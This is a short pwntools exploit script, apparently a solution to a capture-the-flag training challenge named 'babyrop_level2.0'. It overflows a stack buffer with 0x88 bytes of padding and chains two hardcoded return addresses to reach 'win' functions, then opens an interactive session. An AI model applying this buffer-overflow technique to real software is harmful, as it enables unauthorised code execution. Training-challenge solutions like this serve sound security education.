from pwn import *

win1 = 0x401a2c
win2 = 0x401ad9

r = process('/challenge/babyrop_level2.0')


r.send(b'\x00'*0x88 + p64(win1) + p64(win2))

r.interactive()